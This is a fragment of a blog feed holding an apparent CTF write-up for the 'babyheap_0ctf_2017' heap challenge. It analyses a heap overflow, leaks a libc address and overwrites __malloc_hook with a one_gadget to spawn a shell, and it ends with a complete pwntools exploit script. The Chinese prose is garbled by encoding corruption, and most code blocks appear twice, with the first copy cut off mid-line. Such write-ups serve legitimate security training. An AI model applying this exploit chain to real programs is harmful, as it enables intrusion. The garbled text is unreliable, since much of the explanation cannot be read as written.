          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> sqlæ³¨å…¥ </tag>
            
            <tag> boolç›²æ³¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>babyheap_0ctf_2017</title>
      <link href="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/"/>
      <url>/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/</url>
      
        <content type="html"><![CDATA[<p>è¿™ä¸¤å¤©å­¦ä¹ äº†ä¸€äº›å †çš„çŸ¥è¯†ï¼Œè¶çƒ­è®°å½•ä¸€ä¸‹<br>é¦–å…ˆè¿˜æ˜¯ç†Ÿç»ƒçš„checksec<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/1.jpg" alt=""><br>ä¿æŠ¤å…¨å¼€ï¼Œå †é¢˜æ­£å¸¸æ“ä½œ<br>IDAåˆ†æä¸€æ³¢<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/2.jpg" alt=""><br>å››ä¸ªåŠŸèƒ½ï¼Œå¢åˆ æŸ¥æ”¹<br>ä¾æ¬¡è¿›å…¥æ¯ä¸ªåŠŸèƒ½æŸ¥çœ‹ï¼Œé¦–å…ˆæ˜¯AllocateåŠŸèƒ½<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/3.jpg" alt=""><br>æœ€å¤§åˆ†é…16ä¸ª<br>sizeæœ€å¤§ä¸º4096ä¸ªå­—èŠ‚ï¼Œé€šè¿‡callocåˆ†é…å †ï¼Œcallocä¸mallocçš„åŒºåˆ«åœ¨äº<br>calloc ä¼šå°†åˆ†é…çš„å†…å­˜ç©ºé—´æ¯ä¸€ä½éƒ½åˆå§‹åŒ–ä¸º0<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/4.jpg" alt=""><br>è¿™ä¸‰è¡Œä»£ç åˆ†åˆ«ä»£è¡¨flagä½ï¼Œåˆ†é…å³è¢«ç½®1ï¼›åˆ†é…çš„å­—èŠ‚å¤§å°ï¼›æ‰€åˆ†é…çš„å †çš„æŒ‡é’ˆ<br>æ‰€ä»¥è½¬æ¢æˆç»“æ„ä½“å³ä¸º</p><figure class="hljs highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre class=" language-hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span>{</span><br>    <span class="hljs-keyword">int</span> flag;<br>    <span class="hljs-keyword">int</span> lenth;<br>    <span class="hljs-keyword">char</span>*content;<br>}note[<span class="hljs-number"><code class="language-hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span>{</span><br>    <span class="hljs-keyword">int</span> flag;<br>    <span class="hljs-keyword">int</span> lenth;<br>    <span class="hljs-keyword">char</span>*content;<br>}note[<span class="hljs-number">16</span>]<br></code></pre></td></tr></tbody></table></figure><p>å†çœ‹åˆ°FillåŠŸèƒ½<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/5.jpg" alt=""><br>é¦–å…ˆåˆ¤æ–­è¾“å…¥çš„indexæ˜¯å¦ä½äº0åˆ°15ä¹‹é—´å¹¶ä¸”æ˜¯å¦è¢«åˆ†é…<br>å¦‚æœæ˜¯çš„è¯åˆ™è¾“å…¥contentçš„size<br>æ¼æ´ç‚¹å°±åœ¨è¿™é‡Œï¼Œç¨‹åºå¹¶æ²¡æœ‰åˆ¤æ–­contentçš„sizeæ˜¯å¦å°äºæˆ‘ä»¬ä¹‹å‰è¾“å…¥çš„å †çš„sizeï¼Œå¦‚æœæˆ‘ä»¬è¾“å…¥æ›´å¤§çš„sizeï¼Œå°±å¯ä»¥é€ æˆå †æº¢å‡º</p><p>å†çœ‹åˆ°FreeåŠŸèƒ½<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/6.jpg" alt=""><br>ä¸€å¼€å§‹è¿˜æ˜¯å…ˆåˆ¤æ–­æ˜¯å¦å­˜åœ¨<br>ç„¶åæ¸…é›¶æ‰€æœ‰çš„æ•°æ®ï¼Œå¹¶ä¸”æŒ‡é’ˆä¹Ÿç½®NULL<br>freeåŠŸèƒ½å¹¶æ²¡æœ‰æ¼æ´</p><p>æœ€åä¸€ä¸ªdumpåŠŸèƒ½<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/7.jpg" alt=""><br>å’Œä¸Šé¢ä¸€æ ·ï¼Œå…ˆåˆ¤æ–­ï¼Œç„¶åæ‰“å°å¯¹åº”åºå·çš„å †çš„å†…å®¹ï¼Œæ²¡å•¥é—®é¢˜</p><p>åŠŸèƒ½åˆ†æå®Œåå°±å¼€å§‹åˆ†ææ¼æ´ç‚¹<br>FillåŠŸèƒ½å­˜åœ¨å †æº¢å‡ºæ¼æ´ï¼Œè€ŒfreeåŠŸèƒ½æ—¢æ²¡æœ‰UAFæ¼æ´ä¹Ÿæ²¡æœ‰double freeæ¼æ´ï¼Œæ‰€ä»¥è¿™é¢˜ä¸èƒ½åˆ©ç”¨å¸¸è§„çš„é€šè¿‡unsorted binæ¥æ³„éœ²libcåœ°å€çš„æ–¹æ³•ï¼Œè€Œæ˜¯è¦åˆ©ç”¨fastbin attackä¸­çš„ä¸€ç§å«åšchunk extendçš„æ–¹æ³•æ¥æ³„éœ²åœ°å€ï¼Œåœ¨è¿™é‡Œè´´ä¸Šæˆ‘çœ‹åˆ°çš„ä¸€ä¸ªè®²è§£çš„å¾ˆå¥½çš„é“¾æ¥<a href="https://blog.csdn.net/Breeze_CAT/article/details/103788698" target="_blank" rel="noopener">fastbin attackè¯¦è§£</a><br>é¦–å…ˆæŠŠé‡å¤æ“ä½œå°è£…æˆå‡½æ•°</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre class=" language-hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">alloc</span><span class="hljs-params">(size)</span>:</span><br>    io.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    io.sendline(<span class="hljs-string">'1'</span>)<br>    io.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    io.sendline(str(size))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fill</span><span class="hljs-params">(index, content)</span>:</span><br>    io.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    io.sendline(<span class="hljs-string">'2'</span>)<br>    io.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    io.sendline(str(index))<br>    io.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    io.sendline(str(len(content)))<br>    io.recvuntil(<span class="hljs-string">"Content: "</span>)<br>    io.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(index)</span>:</span><br>    io.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    io.sendline(<span class="hljs-string">'3'</span>)<br>    io.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    io.sendline(str(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump</span><span class="hljs-params">(index)</span>:</span><br>    io.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    io.sendline(<span class="hljs-string">'4'</span>)<br>    io.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    io.sendline(str(index))<br>    io.recvuntil(<span class="hljs-string">"Content: \n"</span>)<br>    data=io.recvline()<br>    <span class="hljs-keyword"><code class="language-hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">alloc</span><span class="hljs-params">(size)</span>:</span><br>    io.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    io.sendline(<span class="hljs-string">'1'</span>)<br>    io.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    io.sendline(str(size))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fill</span><span class="hljs-params">(index, content)</span>:</span><br>    io.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    io.sendline(<span class="hljs-string">'2'</span>)<br>    io.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    io.sendline(str(index))<br>    io.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    io.sendline(str(len(content)))<br>    io.recvuntil(<span class="hljs-string">"Content: "</span>)<br>    io.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(index)</span>:</span><br>    io.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    io.sendline(<span class="hljs-string">'3'</span>)<br>    io.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    io.sendline(str(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump</span><span class="hljs-params">(index)</span>:</span><br>    io.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    io.sendline(<span class="hljs-string">'4'</span>)<br>    io.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    io.sendline(str(index))<br>    io.recvuntil(<span class="hljs-string">"Content: \n"</span>)<br>    data=io.recvline()<br>    <span class="hljs-keyword">return</span> data<br></code></pre></td></tr></tbody></table></figure><p>åœ¨æœ¬é¢˜ä¸­ï¼ŒæŒ‰ç…§æ”»å‡»æ€æƒ³ï¼Œé¦–å…ˆalloc4ä¸ªå †</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs python">alloc(<span class="hljs-number">0x18</span>)<span class="hljs-comment">#0</span><br>alloc(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#1</span><br>alloc(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#2</span><br>alloc(<span class="hljs-number">0x18</span>)<span class="hljs-comment"><code class="language-hljs python">alloc(<span class="hljs-number">0x18</span>)<span class="hljs-comment">#0</span><br>alloc(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#1</span><br>alloc(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#2</span><br>alloc(<span class="hljs-number">0x18</span>)<span class="hljs-comment">#3</span><br></code></pre></td></tr></tbody></table></figure><p>alloc0x18å®é™…ä¸Šåˆ†é…äº†0x20å¤§å°çš„å †ï¼Œalloc0x68å®é™…ä¸Šåˆ†é…äº†0x70å¤§å°çš„å †<br>ç„¶åæˆ‘ä»¬fill0å·å †ï¼Œé€ æˆå•å­—èŠ‚æº¢å‡ºï¼Œå³æº¢å‡ºåˆ°1å·å †çš„sizeä½ï¼Œä¿®æ”¹sizeä¸ºsize(1)+size(2)ï¼Œå³0xe1(1ä¸ºä¸Šä¸€ä¸ªå †æ˜¯å¦å¤„äºåˆ†é…çŠ¶æ€çš„æ ‡å¿—ä½)</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs python">payload=<span class="hljs-string">'A'</span>*<span class="hljs-number">0x18</span><br>payload+=p8(<span class="hljs-number">0xe1</span>)<br>fill(<span class="hljs-number"><code class="language-hljs python">payload=<span class="hljs-string">'A'</span>*<span class="hljs-number">0x18</span><br>payload+=p8(<span class="hljs-number">0xe1</span>)<br>fill(<span class="hljs-number">0</span>,payload)<br></code></pre></td></tr></tbody></table></figure><p>è¿™æ ·1å·å †å®é™…ä¸Šå°±åŒ…æ‹¬äº†1å·å †å’Œ2å·å †ï¼Œå±äºsmall chunk.æ¥ä¸‹æ¥æˆ‘ä»¬free1å·å †ï¼Œå½“1å·å †è¢«freeä¹‹åï¼ŒæŒ‰ç…§è§„å®šä¼šè¢«æ”¾å…¥unsorted binå½“ä¸­ï¼Œå¤§å°ä¸º0xe1,æ­¤æ—¶1å·å †çš„fdå’ŒbkæŒ‡é’ˆéƒ½å­˜æ”¾ç€unsorted binçš„è¡¨å¤´<br>(éœ€è¦æ³¨æ„ï¼Œfreeæ‰1å·å †åï¼Œå®é™…ä¸Š2å·å †ä»ç„¶å¤„äºå·²åˆ†é…çŠ¶æ€)<br>ç„¶åæˆ‘ä»¬å†allocä¸€ä¸ªå¤§å°ä¸º0x60çš„å †ï¼Œè¿™æ ·å°±ä»unsorted binå½“ä¸­å‰²é™¤ä¸€å—ï¼Œå³å‰²é™¤äº†åŸæœ¬å±äº1å·å †çš„é‚£ä¸€å—åˆ†é…ç»™äº†æ–°å †ï¼Œå‰©ä¸‹çš„é‚£ä¸€å—å°±æ˜¯å±äº2å·å †çš„é‚£ä¸€å—ï¼Œunsorted binçš„è¡¨å¤´çš„è½¬ç§»åˆ°äº†2å·å †çš„fdå’Œbkå½“ä¸­<br>è€Œ2å·å †ä»ç„¶å¤„äºä½¿ç”¨çŠ¶æ€ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡dumpæ“ä½œæ³„éœ²å‡ºlibc</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs python">free(<span class="hljs-number">1</span>)<br>alloc(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#1</span><br>leak=u64(dump(<span class="hljs-number">2</span>)[:<span class="hljs-number"><code class="language-hljs python">free(<span class="hljs-number">1</span>)<br>alloc(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#1</span><br>leak=u64(dump(<span class="hljs-number">2</span>)[:<span class="hljs-number">8</span>])<br></code></pre></td></tr></tbody></table></figure><p><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/8.jpg" alt=""><br>åç§»ä¸º0x7f5a68c3db78-0x7f5a68879000=0x3C4B78â€¬</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre class=" language-hljs python">libc=leak<span class="hljs-number">-0x3c4b78</span><br>__malloc_hook=libc+<span class="hljs-number">0x3c4b10</span><br>one_gadget=libc+<span class="hljs-number">0x4526a</span><br>log.info(<span class="hljs-string">"leak =&gt; 0x%x"</span> % leak)<br>log.info(<span class="hljs-string">"libc =&gt; 0x%x"</span> % libc)<br>log.info(<span class="hljs-string">"__malloc_hook =&gt; 0x%x"</span> % __malloc_hook)<br>log.info(<span class="hljs-string"><code class="language-hljs python">libc=leak<span class="hljs-number">-0x3c4b78</span><br>__malloc_hook=libc+<span class="hljs-number">0x3c4b10</span><br>one_gadget=libc+<span class="hljs-number">0x4526a</span><br>log.info(<span class="hljs-string">"leak =&gt; 0x%x"</span> % leak)<br>log.info(<span class="hljs-string">"libc =&gt; 0x%x"</span> % libc)<br>log.info(<span class="hljs-string">"__malloc_hook =&gt; 0x%x"</span> % __malloc_hook)<br>log.info(<span class="hljs-string">"one_gadget => 0x%x"</span> % one_gadget)<br></code></pre></td></tr></tbody></table></figure><p>æ³„éœ²å‡ºlibcåœ°å€åï¼Œåˆ©ç”¨å°±å·²ç»å®Œæˆäº†ä¸€å¤§åŠäº†<br>ç”±äºå¼€å¯äº†Full RELROï¼Œå¤å†™gotè¡¨å°±ä¸å¯è¡Œäº†ï¼Œæˆ‘ä»¬è¿™é‡Œå¯é€šè¿‡è¦†ç›–__malloc_hookæŒ‡é’ˆä¸ºone_gadgetæ¥èµ·shell</p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><code class="language-hljs bash">malloc_hook<br>æœ€å¸¸è§ä¹Ÿæ˜¯æœ€å®¹æ˜“çš„ä¸€ç§å †åˆ©ç”¨æ–¹æ³•ã€‚<br>mallocå‡½æ•°ä¼šé¦–å…ˆæ£€æŸ¥malloc_hookçš„å€¼ï¼Œè‹¥ä¸ä¸º0åˆ™ä¼šè°ƒç”¨ä»–ã€‚è‹¥æˆ‘ä»¬èƒ½é€šè¿‡å†…å­˜å†™å…¥malloc_hookå³å¯å®ç°ä»»æ„åœ°å€è·³è½¬<br>é€šè¿‡fastbin_attackæ”»å‡»malloc_hook<br></code></pre></td></tr></tbody></table></figure><p>è§‚å¯Ÿä¸€ä¸‹malloc_hookå‘¨å›´çš„æ•°æ®çš„åˆ†å¸ƒ<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/9.jpg" alt=""><br>ä¼¼ä¹å¹¶æ²¡æœ‰æ»¡è¶³æ¡ä»¶fastbinæ¡ä»¶çš„æ•°æ®ï¼Œä½†åªè¦æˆ‘ä»¬ç¨å¾®è°ƒæ•´ä¸€ä¸‹æ•°æ®åˆ†å¸ƒï¼Œçœ‹åˆ°__malloc_hook-0x23<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/10.jpg" alt=""><br>7fæ­£å¥½æ»¡è¶³fastbinå¤§å°çš„é™åˆ¶ï¼Œå¦‚å›¾æ‰€ç¤º<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/11.jpg" alt=""><br>è¡¥å……å¥½ç›¸åº”çš„çŸ¥è¯†ä»¥åï¼Œå°±å¯ä»¥å¼€å§‹æ„é€ äº†<br>æˆ‘ä»¬å†allocä¸€ä¸ª0x60å¤§å°çš„4å·å †ï¼Œå®é™…ä¸Š4å·å †å’Œ2å·å †æ˜¯å…¬ç”¨çš„<br>ç„¶åfreeæ‰2å·å †ï¼Œè¿™ä¸ªæ—¶å€™binså¦‚ä¸‹<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/12.jpg" alt=""><br>æˆ‘ä»¬å†é€šè¿‡fill4å·å †æŠŠ2å·å †çš„fdæŒ‡é’ˆæŒ‡å‘mallac_hook-0x23å¤„</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs python">alloc(<span class="hljs-number">0x68</span>)<br>free(<span class="hljs-number">2</span>)<br>payload=p64(__malloc_hook<span class="hljs-number">-0x23</span>)<br>fill(<span class="hljs-number"><code class="language-hljs python">alloc(<span class="hljs-number">0x68</span>)<br>free(<span class="hljs-number">2</span>)<br>payload=p64(__malloc_hook<span class="hljs-number">-0x23</span>)<br>fill(<span class="hljs-number">4</span>,payload)<br></code></pre></td></tr></tbody></table></figure><p>çœ‹çœ‹ç°åœ¨çš„bins<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/13.jpg" alt=""><br>æŒ‡å‘äº†<strong>malloc_hook-0x23å¤„ï¼Œæˆ‘ä»¬åªéœ€è¦alloc2æ¬¡ï¼Œå°±èƒ½æŠŠå †åˆ†é…åˆ°</strong>malloc_hook-0x23</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs python">alloc(<span class="hljs-number">0x68</span>)<br>alloc(<span class="hljs-number"><code class="language-hljs python">alloc(<span class="hljs-number">0x68</span>)<br>alloc(<span class="hljs-number">0x68</span>)<br></code></pre></td></tr></tbody></table></figure><p>æ¥ä¸‹æ¥å°±åªéœ€è¦æŒ‰ç…§ä¸Šé¢å…³äºçš„<strong>malloc_hookçš„å›¾è¿›è¡Œå¡«å……å³å¯ï¼ŒæŠŠone_gadgetçš„åœ°å€å¡«å…¥</strong>malloc_hookå¤„ï¼Œç„¶åå†allocä»»æ„å¤§å°çš„å †å³å¯è§¦å‘one_gadgetä»è€Œæ‹¿åˆ°shell</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre class=" language-hljs python">payload=<span class="hljs-string">'b'</span>*<span class="hljs-number">0x13</span>+p64(one_gadget)<br>fill(<span class="hljs-number">5</span>,payload)<br><br>alloc(<span class="hljs-number"><code class="language-hljs python">payload=<span class="hljs-string">'b'</span>*<span class="hljs-number">0x13</span>+p64(one_gadget)<br>fill(<span class="hljs-number">5</span>,payload)<br><br>alloc(<span class="hljs-number">1</span>)<br>io.interactive()<br></code></pre></td></tr></tbody></table></figure><p>å®Œæ•´expå¦‚ä¸‹</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre class=" language-hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level = "debug"</span><br>io = process(<span class="hljs-string">'./babyheap_0ctf_2017'</span>)<br><span class="hljs-comment">#io=remote('node3.buuoj.cn',29849)</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">alloc</span><span class="hljs-params">(size)</span>:</span><br>    io.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    io.sendline(<span class="hljs-string">'1'</span>)<br>    io.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    io.sendline(str(size))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fill</span><span class="hljs-params">(index, content)</span>:</span><br>    io.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    io.sendline(<span class="hljs-string">'2'</span>)<br>    io.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    io.sendline(str(index))<br>    io.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    io.sendline(str(len(content)))<br>    io.recvuntil(<span class="hljs-string">"Content: "</span>)<br>    io.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(index)</span>:</span><br>    io.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    io.sendline(<span class="hljs-string">'3'</span>)<br>    io.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    io.sendline(str(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump</span><span class="hljs-params">(index)</span>:</span><br>    io.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    io.sendline(<span class="hljs-string">'4'</span>)<br>    io.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    io.sendline(str(index))<br>    io.recvuntil(<span class="hljs-string">"Content: \n"</span>)<br>    data=io.recvline()<br>    <span class="hljs-keyword">return</span> data<br><br>alloc(<span class="hljs-number">0x18</span>)<br>alloc(<span class="hljs-number">0x68</span>)<br>alloc(<span class="hljs-number">0x68</span>)<br>alloc(<span class="hljs-number">0x18</span>)<br><br>payload=<span class="hljs-string">'A'</span>*<span class="hljs-number">0x18</span><br>payload+=p8(<span class="hljs-number">0xe1</span>)<br>fill(<span class="hljs-number">0</span>,payload)<br>free(<span class="hljs-number">1</span>)<br><br>alloc(<span class="hljs-number">0x68</span>)<br>leak=u64(dump(<span class="hljs-number">2</span>)[:<span class="hljs-number">8</span>])<br>libc=leak<span class="hljs-number">-0x3c4b78</span><br>__malloc_hook=libc+<span class="hljs-number">0x3c4b10</span><br>one_gadget=libc+<span class="hljs-number">0x4526a</span><br>log.info(<span class="hljs-string">"leak =&gt; 0x%x"</span> % leak)<br>log.info(<span class="hljs-string">"libc =&gt; 0x%x"</span> % libc)<br>log.info(<span class="hljs-string">"__malloc_hook =&gt; 0x%x"</span> % __malloc_hook)<br>log.info(<span class="hljs-string">"one_gadget =&gt; 0x%x"</span> % one_gadget)<br><br>alloc(<span class="hljs-number">0x68</span>)<br>free(<span class="hljs-number">2</span>)<br>payload=p64(__malloc_hook<span class="hljs-number">-0x23</span>)<br>fill(<span class="hljs-number">4</span>,payload)<br>alloc(<span class="hljs-number">0x68</span>)<br>alloc(<span class="hljs-number">0x68</span>)<br><br>payload=<span class="hljs-string">'b'</span>*<span class="hljs-number">0x13</span>+p64(one_gadget)<br>fill(<span class="hljs-number">5</span>,payload)<br><br>alloc(<span class="hljs-number"><code class="language-hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level = "debug"</span><br>io = process(<span class="hljs-string">'./babyheap_0ctf_2017'</span>)<br><span class="hljs-comment">#io=remote('node3.buuoj.cn',29849)</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">alloc</span><span class="hljs-params">(size)</span>:</span><br>    io.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    io.sendline(<span class="hljs-string">'1'</span>)<br>    io.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    io.sendline(str(size))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fill</span><span class="hljs-params">(index, content)</span>:</span><br>    io.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    io.sendline(<span class="hljs-string">'2'</span>)<br>    io.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    io.sendline(str(index))<br>    io.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    io.sendline(str(len(content)))<br>    io.recvuntil(<span class="hljs-string">"Content: "</span>)<br>    io.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(index)</span>:</span><br>    io.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    io.sendline(<span class="hljs-string">'3'</span>)<br>    io.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    io.sendline(str(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump</span><span class="hljs-params">(index)</span>:</span><br>    io.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    io.sendline(<span class="hljs-string">'4'</span>)<br>    io.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    io.sendline(str(index))<br>    io.recvuntil(<span class="hljs-string">"Content: \n"</span>)<br>    data=io.recvline()<br>    <span class="hljs-keyword">return</span> data<br><br>alloc(<span class="hljs-number">0x18</span>)<br>alloc(<span class="hljs-number">0x68</span>)<br>alloc(<span class="hljs-number">0x68</span>)<br>alloc(<span class="hljs-number">0x18</span>)<br><br>payload=<span class="hljs-string">'A'</span>*<span class="hljs-number">0x18</span><br>payload+=p8(<span class="hljs-number">0xe1</span>)<br>fill(<span class="hljs-number">0</span>,payload)<br>free(<span class="hljs-number">1</span>)<br><br>alloc(<span class="hljs-number">0x68</span>)<br>leak=u64(dump(<span class="hljs-number">2</span>)[:<span class="hljs-number">8</span>])<br>libc=leak<span class="hljs-number">-0x3c4b78</span><br>__malloc_hook=libc+<span class="hljs-number">0x3c4b10</span><br>one_gadget=libc+<span class="hljs-number">0x4526a</span><br>log.info(<span class="hljs-string">"leak =&gt; 0x%x"</span> % leak)<br>log.info(<span class="hljs-string">"libc =&gt; 0x%x"</span> % libc)<br>log.info(<span class="hljs-string">"__malloc_hook =&gt; 0x%x"</span> % __malloc_hook)<br>log.info(<span class="hljs-string">"one_gadget =&gt; 0x%x"</span> % one_gadget)<br><br>alloc(<span class="hljs-number">0x68</span>)<br>free(<span class="hljs-number">2</span>)<br>payload=p64(__malloc_hook<span class="hljs-number">-0x23</span>)<br>fill(<span class="hljs-number">4</span>,payload)<br>alloc(<span class="hljs-number">0x68</span>)<br>alloc(<span class="hljs-number">0x68</span>)<br><br>payload=<span class="hljs-string">'b'</span>*<span class="hljs-number">0x13</span>+p64(one_gadget)<br>fill(<span class="hljs-number">5</span>,payload)<br><br>alloc(<span 